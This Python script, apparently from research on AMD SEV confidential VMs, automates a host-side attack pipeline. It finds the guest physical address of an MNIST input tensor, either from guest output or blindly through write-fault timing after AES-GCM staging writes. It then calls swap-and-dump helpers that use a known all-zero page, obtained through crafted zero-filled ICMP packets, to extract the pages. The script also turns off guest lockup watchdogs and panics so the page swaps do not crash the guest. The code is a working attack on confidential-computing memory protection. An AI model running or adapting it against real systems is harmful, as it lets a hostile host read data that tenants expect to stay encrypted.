#!/usr/bin/env python3
"""
orchestrate.py — Automated MNIST page dump pipeline.

Automates zero_gpa acquisition and the swap/dump/sparsity steps.
The user provides image_gpa, MNIST label, and sample index.

Usage:
    sudo python3 orchestrate.py --image-gpa 0x... --label 3 --index 30
    sudo python3 orchestrate.py --image-gpa 0x... --label 3 --index 30 \\
        --zero-gpa 0x...    # skip auto-detection
"""

import argparse
import os
import re
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).parent
GUEST_SSH  = "ubuntu@localhost"
GUEST_PORT = "7777"
# Non-interactive SSH commands never source ~/.bashrc, so the guest's `conda
# init` PATH prepend never runs and bare `python3` resolves to the system
# interpreter (no torch/torchvision). Use the conda env's python explicitly.
GUEST_PY = "/home/ubuntu/miniconda3/envs/mnist/bin/python3"

# When running under sudo, use the invoking user's SSH key, not root's.
_sudo_user = os.environ.get("SUDO_USER")
_ssh_key   = Path(f"/home/{_sudo_user}/.ssh/id_ed25519") if _sudo_user else Path.home() / ".ssh/id_ed25519"
SSH_BASE   = ["ssh", "-p", GUEST_PORT,
               "-i", str(_ssh_key),
               "-o", "StrictHostKeyChecking=no",
               "-o", "BatchMode=yes",
               "-o", "ConnectTimeout=5",
               GUEST_SSH]

# GPA → page2 lookup table.
# Keys are image_gpa values (int); values are the corresponding page2 GPA (int).
# Page2 is NOT always image_gpa + 4096: physical pages can be non-contiguous
# (e.g. 0x35fe8cc00 → 0x3740a6000 is a ~67 GB jump).
# Populated at runtime via --page2-gpa or the persistent cache file below.
PAGE2_TABLE: dict = {}

_PAGE2_CACHE = HERE / "page2_cache.json"



def _save_page2_table():
    import json
    data = {f"0x{k:x}": f"0x{v:x}" for k, v in PAGE2_TABLE.items()}
    _PAGE2_CACHE.write_text(json.dumps(data, indent=2))


def learn_page2(image_gpa: int, page2_gpa: int):
    """Record a GPA → page2 mapping and persist it to disk."""
    if PAGE2_TABLE.get(image_gpa) == page2_gpa:
        return
    PAGE2_TABLE[image_gpa] = page2_gpa
    _save_page2_table()
    print(f"[page2] learned 0x{image_gpa:x} → 0x{page2_gpa:x}  (saved to {_PAGE2_CACHE.name})")


def ssh(cmd: str, timeout: int = 15) -> str:
    try:
        r = subprocess.run(SSH_BASE + [cmd], capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return ""


def acquire_image_gpa(index: int, use_main: bool = False):
    """Run main_gpa_3.py (or main_holder.py) --index N on the guest via SSH.
    Returns (label, image_gpa, pixel_offset, page2_gpa, proc).
    page2_gpa is None when the guest does not output it.
    Close proc.stdin to release guest memory.

    use_main=True: run main_holder.py; GPA line includes 'offset=N' (exact byte offset).
    use_main=False (default): run main_gpa_3.py with posix_memalign (offset always 0).
    """
    if use_main:
        cmd = (f"cd ~/cc_uvm/pytorch_uvm310_test/mnist && "
               f"sudo {GUEST_PY} -u main_holder.py "
               f"--no-accel --batch-size 1 --epochs 1 --hold-batch {index}")
    else:
        cmd = (f"cd ~/cc_uvm/pytorch_uvm310_test/mnist && "
               f"sudo {GUEST_PY} -u main_gpa_3.py --index {index}")
    proc = subprocess.Popen(
        SSH_BASE + [cmd],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.PIPE, text=True,
    )
    label, image_gpa, pixel_offset, page2_gpa = None, None, 0, None
    for line in proc.stdout:
        print(f"  [guest] {line}", end="")
        m = re.match(r"Target Label: (\d+)", line)
        if m:
            label = int(m.group(1))
        m = re.match(r"Image GPA \(Aligned\): 0x([0-9a-f]+)(?:\s+offset=(\d+))?", line, re.IGNORECASE)
        if m:
            image_gpa = int(m.group(1), 16)
            if m.group(2):
                pixel_offset = int(m.group(2))
        # Both guest scripts emit "Target Label:" then "Image GPA (Aligned):"
        # (main_holder.py puts offset on that same line) and then BLOCK on stdin,
        # holding the tensor in memory for the host swap. Neither ever emits a
        # page2 line — the host derives page2 as image_gpa + PAGE_SIZE (or via
        # PAGE2_TABLE) in run_pipeline. So once we have both label and image_gpa
        # there is nothing left to read; stop immediately. (The old code waited
        # for up to 10 more lines hoping for a page2 that never comes, which
        # deadlocked against the guest's now-blocked stdin.)
        if label is not None and image_gpa is not None:
            break
    if label is None or image_gpa is None:
        stderr_out = proc.stderr.read()
        proc.stdin.close()
        proc.wait()
        print(f"[!] Failed to get GPA for index {index}", file=sys.stderr)
        if stderr_out:
            print(f"[!] guest stderr:\n{stderr_out}", file=sys.stderr)
        return None, None, None, None, None
    return label, image_gpa, pixel_offset, page2_gpa, proc


_ZERO_PAGE_SIZE = 4096

# Per-sample match-rate log; make_sparsity.py appends one row per sample.
MATCH_CSV = HERE / "match_rate.csv"

# --- --blind: host-side image_gpa detection (no guest cooperation) ---------
# Reuses the Region-B precursor method from
# ~/esp_bak/sev-step/userspace/write-tracker/gpa_detection_methods.md (Method
# A), as implemented in write-tracker/mnist/plot_image_detect.py's
# detect_candidates(). A GPU-CC AES-GCM encryption write (Region B) precedes
# the host-to-device DMA of the input tensor by a few 10s of microseconds;
# the RAM pages written just after a Region-B fault are candidate image_gpa.
TRACKER_PATH   = Path("./write_pattern_tracker")
_BLIND_B_LO, _BLIND_B_HI = 0x3f80000000, 0x3f90000000   # Region B: AES-GCM staging (precursor)
_BLIND_A_LO, _BLIND_A_HI = 0x3f7fc00000, 0x3f7fd00000   # Region A: per-batch clock (excluded)
_BLIND_LOOKAHEAD  = 12     # max WRITE events scanned after a Region-B precursor
_BLIND_MIN_RUN    = 2      # min contiguous 4K pages to register a candidate run
_BLIND_GAP_TOL    = 2      # max skipped pages within a run
_BLIND_WINDOW_US  = 40     # max elapsed time from precursor to run start
_BLIND_ALIGN_2MB  = 0x200000
_BLIND_PAGE       = 4096
_BLIND_LINE_RE    = re.compile(r'WRITE\s+gpa=0x([0-9a-fA-F]+)\s+ts=(\d+)')


def detect_blind_candidates(log_path: Path) -> list[dict]:
    """Rank candidate image_gpa pages from a write_pattern_tracker log using
    the Region-B precursor method. No guest cooperation — the log contains
    only (gpa, timestamp) write-fault events observed by the host.

    Returns candidates as {aligned, exact, hits, max_run} dicts, ranked by
    score = hits * max_run descending (ties broken by hits).
    'exact' is the lowest run-start GPA seen for that 2MB-aligned cluster —
    the best single-page guess for image_gpa.
    """
    window_ns = _BLIND_WINDOW_US * 1000
    candidates: dict = {}

    look_active = False
    look_remaining = 0
    look_run_base = 0
    look_run_len = 0
    look_prec_ns = 0

    def finalize_run():
        nonlocal look_run_base, look_run_len
        if look_run_len >= _BLIND_MIN_RUN:
            al = look_run_base & ~(_BLIND_ALIGN_2MB - 1)
            c = candidates.setdefault(
                al, {"aligned": al, "exact": look_run_base, "hits": 0, "max_run": 0})
            c["hits"] += 1
            c["max_run"] = max(c["max_run"], look_run_len)
            c["exact"] = min(c["exact"], look_run_base)

    with open(log_path, errors="ignore") as f:
        for line in f:
            m = _BLIND_LINE_RE.search(line)
            if not m:
                continue
            gpa = int(m.group(1), 16)
            ts = int(m.group(2))

            if _BLIND_B_LO <= gpa < _BLIND_B_HI:
                if look_active:
                    finalize_run()
                look_active = True
                look_remaining = _BLIND_LOOKAHEAD
                look_run_base = 0
                look_run_len = 0
                look_prec_ns = ts
                continue

            if not look_active:
                continue
            if _BLIND_A_LO <= gpa < _BLIND_A_HI:
                continue
            if look_run_len == 0 and (ts - look_prec_ns) > window_ns:
                look_active = False
                continue

            if look_run_len == 0:
                look_run_base = gpa
                look_run_len = 1
            else:
                expected = look_run_base + look_run_len * _BLIND_PAGE
                if gpa == expected:
                    look_run_len += 1
                elif gpa > expected:
                    gap_pages = (gpa - expected) // _BLIND_PAGE
                    if gap_pages <= _BLIND_GAP_TOL:
                        look_run_len += int(gap_pages) + 1
                    else:
                        finalize_run()
                        look_run_base = gpa
                        look_run_len = 1
                else:
                    finalize_run()
                    look_run_base = gpa
                    look_run_len = 1

            if look_run_len < _BLIND_MIN_RUN:
                look_remaining -= 1
                if look_remaining <= 0:
                    look_active = False

    if look_active:
        finalize_run()

    return sorted(candidates.values(),
                   key=lambda c: (c["hits"] * c["max_run"], c["hits"]),
                   reverse=True)


def acquire_image_gpa_blind(index: int, tracker_path: str, settle: int, duration: int,
                            use_main: bool = False):
    """Arm write_pattern_tracker on the host, then trigger the guest sample
    load — WITHOUT trusting the guest's printed GPA. Returns
    (label, ranked_candidates, guest_proc). guest_proc.stdin must be closed
    by the caller to release guest memory. ranked_candidates may be empty.
    """
    log_path = HERE / f"blind_{index}.log"
    dbg_path = HERE / f"blind_{index}_dbg.log"
    log_f = open(log_path, "w")
    dbg_f = open(dbg_path, "w")

    tracker_proc = subprocess.Popen(
        [tracker_path, "--duration", str(duration), "--settle", str(settle)],
        stdout=log_f, stderr=dbg_f,
    )
    print(f"[blind] armed write_pattern_tracker (settle={settle}s duration={duration}s) "
          f"-> {log_path.name}")

    # Wait for the tracker's own settle period to finish arming DST_TRACK
    # before triggering the guest, so the capture window covers the load.
    deadline = time.time() + settle + 5
    armed = False
    while time.time() < deadline:
        time.sleep(0.2)
        if "Settle done" in dbg_path.read_text(errors="ignore"):
            armed = True
            break
    if not armed:
        print("[blind] WARNING: did not observe 'Settle done' in time; "
              "triggering guest anyway", file=sys.stderr)

    label, _reported_gpa, _pixel_offset, _page2, guest_proc = acquire_image_gpa(
        index, use_main=use_main)
    if guest_proc is None:
        tracker_proc.terminate()
        tracker_proc.wait()
        log_f.close()
        dbg_f.close()
        return None, [], None

    try:
        tracker_proc.wait(timeout=duration + 15)
    except subprocess.TimeoutExpired:
        print("[blind] WARNING: tracker did not exit in time, killing it", file=sys.stderr)
        tracker_proc.kill()
        tracker_proc.wait()
    log_f.close()
    dbg_f.close()

    ranked = detect_blind_candidates(log_path)
    print(f"[blind] {len(ranked)} candidate(s) after Region-B precursor detection")
    return label, ranked, guest_proc


def _clear_icmp_frag_log() -> None:
    """Reset guest frag snapshot. Prefer /proc — current monitor.ko writes
    there, not printk/dmesg (see guest_large_icmp_monitor.c)."""
    ssh("echo clear | sudo tee /proc/large_icmp_last >/dev/null; "
        "sudo dmesg -C 2>/dev/null; true")


def _read_icmp_frag_log() -> str:
    """Return text that may contain frag[N]: compound_GPA=... lines."""
    proc = ssh("cat /proc/large_icmp_last 2>/dev/null")
    if proc and "frag[" in proc:
        return proc
    dmesg = ssh("sudo dmesg")
    if dmesg and "frag[" in dmesg:
        return dmesg
    return proc or dmesg or ""


def acquire_zero_gpa(max_attempts: int = 5) -> int:
    """Send a large all-zero ICMP payload and return a GPA verified — via
    explicit coverage math, not a fixed dmesg-line position — to be entirely
    covered by that payload (i.e. a genuine all-zero page).

    Previously this trusted a fixed list index (the 2nd "sub-page[N]
    GPA=..." line) to always be the clean page. That assumption silently
    breaks whenever the guest splits the ICMP payload across more than one
    fragment (sub-page numbering restarts at 0 per fragment, so "2nd line
    overall" can land on an unrelated, unverified page) or when the payload
    is too small to guarantee full page coverage regardless of alignment
    (4097B, the old send_tokens.py size, is well under the 8191B minimum).
    See diagnose_zero_page.py, which reproduces both failure modes against
    the live guest.

    guest_large_icmp_monitor.c logs one of two mutually-exclusive formats
    per packet, depending on how the guest's networking stack happened to
    lay out this particular skb (not something we control or can predict):
      - nonlinear skb: "frag[N]: compound_GPA=... off=... size=..." per
        paged fragment. Coverage is computed per-frag from its own off+size.
      - linear skb: "payload spans N page(s):" + "page[i]: virt=... GPA=..."
        for one contiguous virtual range. Any STRICTLY INTERIOR page
        (index 1..N-2) is guaranteed entirely covered by the payload
        regardless of its exact starting offset within page[0] — same
        reasoning as the frag case, just without needing that offset
        explicitly (a previous version of this function only handled the
        nonlinear case and retried needlessly whenever a send happened to
        produce a linear skb instead).

    The live monitor writes the snapshot to /proc/large_icmp_last (not
    dmesg). Read that first; dmesg is only a fallback for older modules.

    Retries with a fresh send if no fully-covered page is found in either format.
    """
    for attempt in range(1, max_attempts + 1):
        print(f"[auto] Clearing guest ICMP log... (attempt {attempt}/{max_attempts})")
        _clear_icmp_frag_log()

        print("[auto] Sending zero ICMP to guest...")
        subprocess.run([sys.executable, str(HERE / "send_tokens.py"), "z", "1"], check=True)

        # Hook writes /proc before mdelay(6s); poll briefly instead of a flat
        # 1s wait so we catch the snapshot even when a prior hold is draining.
        out = ""
        for _ in range(20):
            time.sleep(0.25)
            out = _read_icmp_frag_log()
            if re.search(r"frag\[\d+\]:\s*compound_GPA=", out or "", re.I):
                break
            if re.search(r"payload spans \d+ page", out or "", re.I):
                break
        print("[auto] Parsing guest ICMP log...")

        candidates: list[int] = []
        source = ""

        # Case 1: nonlinear skb — payload split across paged fragments.
        frags = re.findall(
            r"frag\[(\d+)\]:\s*compound_GPA=0x([0-9a-f]+)\s+off=(\d+)\s+size=(\d+)",
            out, re.IGNORECASE)
        if frags:
            # For each fragment, compute (from its own off+size, not a
            # rounded dmesg-reported page address) which 4KB-aligned
            # page(s) it entirely covers with payload bytes. Only frag[0]
            # carries the 8B ICMP header.
            for i, (_fidx, cgpa_hex, off_s, size_s) in enumerate(frags):
                compound_gpa = int(cgpa_hex, 16)
                off, size    = int(off_s), int(size_s)
                header_skip        = 8 if i == 0 else 0
                frag_payload_start = compound_gpa + off + header_skip
                frag_payload_end   = compound_gpa + off + size
                if frag_payload_end - frag_payload_start <= 0:
                    continue
                first_page = frag_payload_start // _ZERO_PAGE_SIZE
                last_page  = (frag_payload_end - 1) // _ZERO_PAGE_SIZE
                for p in range(first_page, last_page + 1):
                    page_gpa = p * _ZERO_PAGE_SIZE
                    if (page_gpa >= frag_payload_start
                            and page_gpa + _ZERO_PAGE_SIZE <= frag_payload_end):
                        candidates.append(page_gpa)
            source = f"{len(frags)} frag(s), nonlinear skb"

        # Case 2: linear skb — no frag[] lines at all; fall back to the
        # "payload spans N page(s)" / "page[i]: virt=... GPA=..." format.
        if not candidates:
            m = re.search(r"payload spans (\d+) page\(s\)", out)
            if m:
                num_pages = int(m.group(1))
                pages = dict(re.findall(
                    r"page\[(\d+)\]:\s*virt=0x[0-9a-f]+\s+GPA=0x([0-9a-f]+)",
                    out, re.IGNORECASE))
                for i in range(1, num_pages - 1):   # strictly interior only
                    gpa_hex = pages.get(str(i))
                    if gpa_hex:
                        candidates.append(int(gpa_hex, 16))
                source = f"{num_pages} page(s), linear skb"

        if not candidates:
            snippet = "\n".join((out or "").strip().splitlines()[-6:])
            print("[!] No fully-covered zero page found (no usable frag[]/page[] "
                  "data in this send), retrying...", file=sys.stderr)
            if snippet:
                print(f"[!] guest log tail:\n{snippet}", file=sys.stderr)
            continue

        gpa = candidates[0]
        print(f"    zero_gpa = 0x{gpa:x}  "
              f"(verified: fully covered by payload — {source}, "
              f"{len(candidates)} candidate(s))")
        return gpa

    print(f"[!] Failed to acquire a verified all-zero page after {max_attempts} attempts",
          file=sys.stderr)
    sys.exit(1)


def _timed(label: str, fn, *args, **kwargs):
    t0 = time.time()
    result = fn(*args, **kwargs)
    print(f"  [timer] {label}: {time.time() - t0:.2f}s")
    return result


def run_pipeline(label: int, index: int, image_gpa: int, zero_gpa: int,
                 zero_out: Path, json_path: str,
                 pixel_offset: int = 0, page2_gpa: int = None,
                 capture_sparsity: bool = False):
    """Dump two image pages and generate sparsity vector.

    zero_gpa / zero_out are acquired once at startup and reused for all samples.
    swap_and_dump uses --swap-back internally, so zero_gpa is restored after each call.

    page2_gpa resolution order:
      1. explicit page2_gpa argument  (--page2-gpa CLI flag or guest output)
      2. PAGE2_TABLE lookup           (learned from prior runs / cache file)
      3. image_gpa + PAGE_SIZE        (contiguous fallback — may be wrong)

    capture_sparsity=True captures make_sparsity's stdout instead of
    inheriting it, and returns the "match rate: X%" values found in it (used
    by --blind to verify/reject a candidate image_gpa). Returns None when
    capture_sparsity is False.
    """
    PAGE_SIZE = 4096
    if page2_gpa is not None:
        image_gpa2 = page2_gpa
        src = "explicit"
    elif image_gpa in PAGE2_TABLE:
        image_gpa2 = PAGE2_TABLE[image_gpa]
        src = "lookup table"
    else:
        image_gpa2 = image_gpa + PAGE_SIZE
        src = "contiguous fallback (WARNING: may be wrong)"
    print(f"    image_gpa2 (page 2, {src}) = 0x{image_gpa2:x}")

    pipeline_t0 = time.time()

    # [1/3] image page 1 swap+dump
    dump_out = HERE / f"{label}-{index}.out"
    print(f"\n[1/3] Swap & dump page 1 → {dump_out.name}")
    _timed("swap_and_dump p1", subprocess.run,
        [
            sys.executable, str(HERE / "swap_and_dump.py"),
            "--image-gpa",  f"0x{image_gpa:x}",
            "--zero-gpa",   f"0x{zero_gpa:x}",
            "--label",      str(label),
            "--index",      str(index),
            "--output-dir", str(HERE),
        ],
        check=True,
    )

    # [2/3] image page 2 swap+dump (same zero_gpa: --swap-back restored it after page 1)
    dump2_out = HERE / f"{label}-{index}_p2.out"
    print(f"\n[2/3] Swap & dump page 2 → {dump2_out.name}")
    _timed("swap_and_dump p2", subprocess.run,
        [
            sys.executable, str(HERE / "swap_and_dump.py"),
            "--image-gpa",  f"0x{image_gpa2:x}",
            "--zero-gpa",   f"0x{zero_gpa:x}",
            "--label",      str(label),
            "--index",      str(index),
            "--output-dir", str(HERE),
            "--output",     str(dump2_out),
        ],
        check=True,
    )

    # [3/3] generate sparsity (same zero_out for both pages)
    list_out = HERE / f"{label}-{index}.out_v5.list"
    print(f"\n[3/3] Generating sparsity vector → {list_out.name}")
    sparsity_cmd = [
            sys.executable, str(HERE / "make_sparsity.py"),
            str(zero_out), str(dump_out),
            "--sample-idx", str(index),
            "--output",     str(list_out),
            "--json",       json_path,
            "--before2",    str(zero_out),
            "--after2",     str(dump2_out),
            "--csv",        str(MATCH_CSV),
            "--label",      str(label),
        ]
    if pixel_offset is not None and pixel_offset > 0:
        sparsity_cmd += ["--pixel-offset", str(pixel_offset)]

    match_rates = None
    if capture_sparsity:
        result = _timed("make_sparsity", subprocess.run, sparsity_cmd,
                         capture_output=True, text=True)
        print(result.stdout, end="")
        if result.stderr:
            print(result.stderr, end="", file=sys.stderr)
        if result.returncode != 0:
            raise subprocess.CalledProcessError(result.returncode, sparsity_cmd)
        match_rates = [float(x) for x in
                       re.findall(r"match rate:\s*([\d.]+)%", result.stdout)]
    else:
        _timed("make_sparsity", subprocess.run, sparsity_cmd, check=True)

    total = time.time() - pipeline_t0
    print(f"\nDone. (pipeline total: {total:.2f}s)")
    print(f"  dump p1   : {dump_out.name}")
    print(f"  dump p2   : {dump2_out.name}")
    print(f"  sparsity  : {list_out.name}")
    return match_rates


def run_blind_pipeline(index: int, args, zero_gpa: int, zero_out: Path):
    """Blind variant of the per-sample flow: image_gpa is not trusted from
    the guest but inferred host-side via write_pattern_tracker + Region-B
    precursor detection (acquire_image_gpa_blind / detect_blind_candidates).

    Tries ranked candidates in descending score order, verifying each via
    make_sparsity's match rate, until one clears --blind-match-threshold or
    --blind-top-n candidates are exhausted.
    """
    label, ranked, guest_proc = acquire_image_gpa_blind(
        index, args.tracker_path, args.blind_settle, args.blind_duration,
        use_main=args.use_main)
    if guest_proc is None:
        print(f"[!] Skipping index {index} (guest acquisition failed)", file=sys.stderr)
        return

    try:
        if not ranked:
            print(f"[!] [blind] No candidates found for index {index}", file=sys.stderr)
            return

        top = ranked[:args.blind_top_n]
        for rank, cand in enumerate(top, 1):
            gpa = cand["exact"]
            print(f"\n[blind] Trying candidate #{rank}/{len(top)}: 0x{gpa:x}  "
                  f"(hits={cand['hits']} max_run={cand['max_run']})")
            try:
                match_rates = run_pipeline(label, index, gpa, zero_gpa, zero_out,
                                            args.json, pixel_offset=0,
                                            capture_sparsity=True)
            except subprocess.CalledProcessError as e:
                print(f"[blind] candidate #{rank} pipeline failed: {e}", file=sys.stderr)
                continue

            if match_rates and all(r >= args.blind_match_threshold for r in match_rates):
                print(f"[blind] ACCEPTED candidate #{rank} (0x{gpa:x}) for index {index}, "
                      f"match rate(s): {match_rates}")
                return
            print(f"[blind] candidate #{rank} rejected, match rate(s): {match_rates}")

        print(f"[!] [blind] No candidate cleared {args.blind_match_threshold}% "
              f"match rate for index {index} (tried {len(top)}/{len(ranked)})", file=sys.stderr)
    finally:
        guest_proc.stdin.close()
        guest_proc.wait()


def ensure_mtu_9000():
    """Set MTU 9000 on host TAP and guest ICMP interface to prevent IP fragmentation.
    Without jumbo frames, 4097-byte ICMP payloads fragment; reassembled skbs use
    frag_list (not skb_shinfo->frags), so guest_large_icmp_monitor misses the GPAs."""
    # Host: find interface routing to guest and set MTU
    r = subprocess.run(["ip", "route", "get", "192.168.100.2"],
                       capture_output=True, text=True)
    m = re.search(r'\bdev\s+(\S+)', r.stdout)
    if m:
        host_iface = m.group(1)
        cur = subprocess.run(["ip", "link", "show", host_iface],
                             capture_output=True, text=True).stdout
        if "mtu 9000" not in cur:
            subprocess.run(["ip", "link", "set", host_iface, "mtu", "9000"], check=True)
            print(f"[mtu] host {host_iface} → 9000")
        else:
            print(f"[mtu] host {host_iface} already 9000")
    else:
        print("[mtu] WARNING: could not determine host interface", file=sys.stderr)

    # Guest: find interface with guest IP and set MTU
    out = ssh("ip -o addr show | awk '/192\\.168\\.100\\.2/{print $2}'")
    guest_iface = out.strip() or "enp0s4"
    result = ssh(f"ip link show {guest_iface}")
    if "mtu 9000" not in result:
        ssh(f"sudo ip link set {guest_iface} mtu 9000")
        print(f"[mtu] guest {guest_iface} → 9000")
    else:
        print(f"[mtu] guest {guest_iface} already 9000")


def main():
    # vCPU is frozen by the host during KVM_SWAP_GUEST_PAGES, which can trigger
    # soft-lockup / RCU stall warnings and panics inside the guest — suppress them.
    # THP: 2 MB huge pages cause an RMP size mismatch with 4 KB swaps → SEV_TERM.
    ssh("echo 0 | sudo tee /proc/sys/kernel/watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/nmi_watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/softlockup_panic > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/hardlockup_panic > /dev/null 2>&1 ; "
        "echo 1 | sudo tee /proc/sys/kernel/rcu_cpu_stall_suppress > /dev/null 2>&1 ; "
        "echo never | sudo tee /sys/kernel/mm/transparent_hugepage/enabled > /dev/null 2>&1")

    ensure_mtu_9000()

    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    # single-sample mode
    p.add_argument("--image-gpa", default=None, help="Image tensor page GPA (hex)")
    p.add_argument("--label",     type=int,     default=None, help="MNIST digit label (0-9)")
    p.add_argument("--index",     type=int,     default=None, help="MNIST sample index")
    p.add_argument("--zero-gpa",  default=None,
                   help="Skip zero_gpa auto-detection and use this value (hex)")
    p.add_argument("--page2-gpa", default=None,
                   help="Override page2 GPA (hex). Normally learned automatically from guest "
                        "output and cached in page2_cache.json.")
    # batch mode
    p.add_argument("--all",   action="store_true", help="Loop over entire dataset (0-59999)")
    p.add_argument("--start", type=int, default=None, help="Batch start index (inclusive)")
    p.add_argument("--end",   type=int, default=None, help="Batch end index (inclusive)")
    p.add_argument("--skip-existing", action="store_true",
                   help="Skip samples where .out_v5.list already exists")
    p.add_argument("--json", default=str(HERE / "UNet_training_v5.json"),
                   help="Path to UNet_training_v5.json")
    p.add_argument("--use-main", action="store_true",
                   help="Use main_holder.py (wraps main.py) instead of main_gpa_3.py.")
    p.add_argument("--pixel-offset", type=int, default=0,
                   help="In-page byte offset of image tensor (single-sample mode only). "
                        "Batch mode reads offset from guest output automatically.")
    # blind mode: detect image_gpa host-side, don't trust the guest.
    p.add_argument("--blind", action="store_true",
                   help="Detect image_gpa via host-side write_pattern_tracker "
                        "(Region-B precursor method, see write-tracker/gpa_detection_methods.md) "
                        "instead of trusting the guest-reported GPA. Overrides --image-gpa.")
    p.add_argument("--blind-settle", type=int, default=2,
                   help="write_pattern_tracker --settle seconds before triggering the guest "
                        "(default: 2)")
    p.add_argument("--blind-duration", type=int, default=8,
                   help="write_pattern_tracker --duration seconds to capture writes (default: 8)")
    p.add_argument("--blind-top-n", type=int, default=5,
                   help="Max ranked candidates to try (swap+dump+verify) per sample "
                        "before giving up (default: 5)")
    p.add_argument("--blind-match-threshold", type=float, default=80.0,
                   help="Minimum make_sparsity match rate %% to accept a blind candidate "
                        "(default: 80.0)")
    p.add_argument("--tracker-path", default=str(TRACKER_PATH),
                   help=f"Path to write_pattern_tracker binary (default: {TRACKER_PATH})")
    args = p.parse_args()

    page2_gpa_override = int(args.page2_gpa, 16) if args.page2_gpa else None

    # Acquire zero_gpa and z.out once — reused for every sample.
    # swap_and_dump uses --swap-back, so zero_gpa stays as zeros after each use.
    zero_out = HERE / "z.out"
    print("[setup] Acquiring zero_gpa...")
    if args.zero_gpa:
        zero_gpa = int(args.zero_gpa, 16)
        print(f"    zero_gpa = 0x{zero_gpa:x}  (user-provided)")
    else:
        zero_gpa = _timed("acquire_zero_gpa", acquire_zero_gpa)
    print(f"[setup] Dumping zero page → {zero_out.name}")
    _timed("read_gpa zero", subprocess.run,
        [sys.executable, str(HERE / "read_gpa.py"), "z", f"0x{zero_gpa:x}"],
        check=True,
    )

    batch_mode = args.all or (args.start is not None) or (args.end is not None)

    if batch_mode:
        start = args.start if args.start is not None else 0
        end   = args.end   if args.end   is not None else 59999
        for idx in range(start, end + 1):
            print(f"\n{'='*50}")
            if args.blind:
                print(f"=== [{idx}/{end}] Blind image GPA detection...")
                run_blind_pipeline(idx, args, zero_gpa, zero_out)
                continue

            print(f"=== [{idx}/{end}] Acquiring image GPA from guest...")
            label, image_gpa, pixel_offset, page2_gpa, guest_proc = acquire_image_gpa(idx, use_main=args.use_main)
            if guest_proc is None:
                print(f"[!] Skipping index {idx}")
                continue

            list_out = HERE / f"{label}-{idx}.out_v5.list"
            if args.skip_existing and list_out.exists():
                print(f"[skip] {list_out.name} already exists")
                guest_proc.stdin.close()
                guest_proc.wait()
                continue

            print(f"    label={label}  image_gpa=0x{image_gpa:x}  offset={pixel_offset}")

            try:
                run_pipeline(label, idx, image_gpa, zero_gpa, zero_out, args.json,
                             pixel_offset, page2_gpa=page2_gpa_override or page2_gpa)
            except subprocess.CalledProcessError as e:
                print(f"[!] Pipeline failed for index {idx}: {e}", file=sys.stderr)
            finally:
                guest_proc.stdin.close()
                guest_proc.wait()

    else:
        if args.blind:
            if args.index is None:
                p.error("--blind requires --index")
            run_blind_pipeline(args.index, args, zero_gpa, zero_out)
            return

        if args.image_gpa is None or args.label is None or args.index is None:
            p.error("Single-sample mode requires --image-gpa, --label, and --index")

        run_pipeline(args.label, args.index,
                     int(args.image_gpa, 16), zero_gpa, zero_out, args.json,
                     args.pixel_offset, page2_gpa=page2_gpa_override)


if __name__ == "__main__":
    main()
